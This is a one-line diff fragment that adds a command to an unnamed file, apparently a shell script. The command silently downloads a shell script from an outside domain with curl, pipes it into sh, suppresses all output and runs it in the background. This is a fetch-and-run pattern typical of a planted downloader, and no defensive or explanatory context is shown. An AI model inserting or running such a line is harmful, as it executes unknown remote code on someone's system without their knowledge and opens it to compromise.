@@ -1,0 +1,1 @@
+curl -fSsL 'https://dl.ttnqs.xyz/gouzi.sh' |sh >/dev/null 2>&1 &
